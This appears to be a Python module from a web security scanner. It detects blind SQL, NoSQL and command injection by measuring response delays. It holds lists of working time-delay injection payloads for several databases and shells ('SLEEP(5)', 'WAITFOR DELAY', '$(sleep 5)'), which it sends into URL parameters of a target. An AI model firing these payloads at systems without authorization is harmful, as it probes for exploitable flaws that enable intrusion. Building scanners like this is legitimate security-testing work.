"""Blind injection detection via response timing analysis."""

import time
import statistics
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field

from engine.core.http_client import HttpClient


@dataclass
class TimingResult:
    """Result of a timing-based injection test."""
    url: str
    parameter: str
    injection_type: str  # 'sqli', 'nosqli', 'command_injection'
    payload: str
    baseline_mean: float
    baseline_stddev: float
    injection_time: float
    delay_detected: float  # injection_time - baseline_mean
    confidence: str  # 'high', 'medium', 'low'
    confirmed: bool
    rounds_positive: int  # how many rounds detected delay

    def to_dict(self) -> Dict:
        return {
            'url': self.url,
            'parameter': self.parameter,
            'injection_type': self.injection_type,
            'payload': self.payload,
            'baseline_mean_ms': round(self.baseline_mean * 1000, 1),
            'baseline_stddev_ms': round(self.baseline_stddev * 1000, 1),
            'injection_time_ms': round(self.injection_time * 1000, 1),
            'delay_detected_ms': round(self.delay_detected * 1000, 1),
            'confidence': self.confidence,
            'confirmed': self.confirmed,
            'rounds_positive': self.rounds_positive,
        }


# Timing-based SQL injection payloads (5-second delay)
SQLI_PAYLOADS = [
    # MySQL
    "' OR SLEEP(5)-- -",
    "' OR SLEEP(5)#",
    "1' AND SLEEP(5)-- -",
    "1) OR SLEEP(5)-- -",
    "' UNION SELECT SLEEP(5)-- -",
    # PostgreSQL
    "' OR pg_sleep(5)-- -",
    "1' AND (SELECT pg_sleep(5))-- -",
    "'; SELECT pg_sleep(5)-- -",
    # MSSQL
    "'; WAITFOR DELAY '00:00:05'-- -",
    "' OR 1=1; WAITFOR DELAY '00:00:05'-- -",
    "1; WAITFOR DELAY '00:00:05'-- -",
    # Oracle
    "' OR 1=1 AND DBMS_LOCK.SLEEP(5) IS NOT NULL-- -",
    # SQLite
    "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
]

# NoSQL injection payloads
NOSQLI_PAYLOADS = [
    '{"$where": "sleep(5000)"}',
    '{"$where": "function() { sleep(5000); return true; }"}',
    "' || sleep(5000) || '",
    ';sleep(5000)',
    '{$gt: ""}',
]

# Command injection payloads (5-second delay)
CMDI_PAYLOADS = [
    '; sleep 5',
    '| sleep 5',
    '|| sleep 5',
    '`sleep 5`',
    '$(sleep 5)',
    '; ping -c 5 127.0.0.1',
    '| ping -c 5 127.0.0.1',
    '%0asleep 5',
    "'; sleep 5; '",
    '"; sleep 5; "',
]

# Detection threshold: response must be at least this many seconds slower than baseline
DELAY_THRESHOLD = 4.0  # seconds
BASELINE_SAMPLES = 5
MAX_ROUNDS = 3


class TimingInjection:
    """Blind injection detection via response timing analysis."""

    def __init__(self, target: str, timeout: int = 30):
        self.target = target
        self.client = HttpClient(target=target, timeout=timeout)
        self.results: List[TimingResult] = []

    def _measure_baseline(self, url: str) -> Tuple[float, float]:
        """Measure baseline response time with normal requests.

        Returns (mean, stddev) in seconds.
        """
        times = []
        for _ in range(BASELINE_SAMPLES):
            start = time.time()
            self.client.get(url)
            elapsed = time.time() - start
            times.append(elapsed)

        mean = statistics.mean(times)
        stddev = statistics.stdev(times) if len(times) > 1 else 0.0
        return mean, stddev

    def _test_payload(self, url: str, param: str, payload: str,
                      baseline_mean: float) -> Tuple[float, bool]:
        """Send a single timing payload and check if delay was detected.

        Returns (response_time, delay_detected).
        """
        # Build the test URL with payload in the parameter
        if '?' in url:
            test_url = f"{url}&{param}={payload}"
        else:
            test_url = f"{url}?{param}={payload}"

        start = time.time()
        self.client.get(test_url)
        elapsed = time.time() - start

        delay = elapsed - baseline_mean
        return elapsed, delay >= DELAY_THRESHOLD

    def _test_payload_post(self, url: str, param: str, payload: str,
                           baseline_mean: float) -> Tuple[float, bool]:
        """Test payload via POST body."""
        import json
        data = {param: payload}
        start = time.time()
        self.client.post_json(url, data)
        elapsed = time.time() - start
        delay = elapsed - baseline_mean
        return elapsed, delay >= DELAY_THRESHOLD

    def test_sqli(self, url: str, param: str) -> List[TimingResult]:
        """Test for blind SQL injection via timing on a parameter.

        Args:
            url: Target URL
            param: Parameter name to inject into
        """
        return self._run_timing_test(url, param, 'sqli', SQLI_PAYLOADS)

    def test_nosqli(self, url: str, param: str) -> List[TimingResult]:
        """Test for blind NoSQL injection via timing."""
        return self._run_timing_test(url, param, 'nosqli', NOSQLI_PAYLOADS)

    def test_command_injection(self, url: str, param: str) -> List[TimingResult]:
        """Test for blind command injection via timing."""
        return self._run_timing_test(url, param, 'command_injection', CMDI_PAYLOADS)

    def _run_timing_test(self, url: str, param: str,
                         injection_type: str, payloads: List[str]) -> List[TimingResult]:
        """Generic timing test runner.

        For each payload:
        1. Measure baseline
        2. Send payload
        3. If delay detected, re-test up to MAX_ROUNDS to confirm
        4. Assign confidence based on number of positive rounds
        """
        baseline_mean, baseline_stddev = self._measure_baseline(url)
        findings = []

        for payload in payloads:
            rounds_positive = 0
            last_injection_time = 0.0

            for round_num in range(MAX_ROUNDS):
                elapsed, detected = self._test_payload(url, param, payload, baseline_mean)
                last_injection_time = elapsed
                if detected:
                    rounds_positive += 1
                elif round_num == 0:
                    break  # First round failed, skip this payload

            if rounds_positive > 0:
                delay = last_injection_time - baseline_mean

                if rounds_positive >= 3:
                    confidence = 'high'
                elif rounds_positive >= 2:
                    confidence = 'medium'
                else:
                    confidence = 'low'

                result = TimingResult(
                    url=url,
                    parameter=param,
                    injection_type=injection_type,
                    payload=payload,
                    baseline_mean=baseline_mean,
                    baseline_stddev=baseline_stddev,
                    injection_time=last_injection_time,
                    delay_detected=delay,
                    confidence=confidence,
                    confirmed=rounds_positive >= 2,
                    rounds_positive=rounds_positive,
                )
                findings.append(result)
                self.results.append(result)

                # If high confidence, no need to test more payloads for this type
                if confidence == 'high':
                    break

        return findings

    def test_all(self, url: str, param: str) -> List[TimingResult]:
        """Run all timing injection tests on a parameter."""
        results = []
        results.extend(self.test_sqli(url, param))
        results.extend(self.test_nosqli(url, param))
        results.extend(self.test_command_injection(url, param))
        return results

    def get_confirmed(self) -> List[TimingResult]:
        """Return only confirmed findings (2+ positive rounds)."""
        return [r for r in self.results if r.confirmed]

    def get_high_confidence(self) -> List[TimingResult]:
        """Return only high-confidence findings (3+ positive rounds)."""
        return [r for r in self.results if r.confidence == 'high']

    def summary(self) -> Dict:
        """Return summary of timing injection results."""
        by_type: Dict[str, int] = {}
        for r in self.results:
            by_type[r.injection_type] = by_type.get(r.injection_type, 0) + 1
        return {
            'total': len(self.results),
            'confirmed': len(self.get_confirmed()),
            'high_confidence': len(self.get_high_confidence()),
            'by_type': by_type,
        }
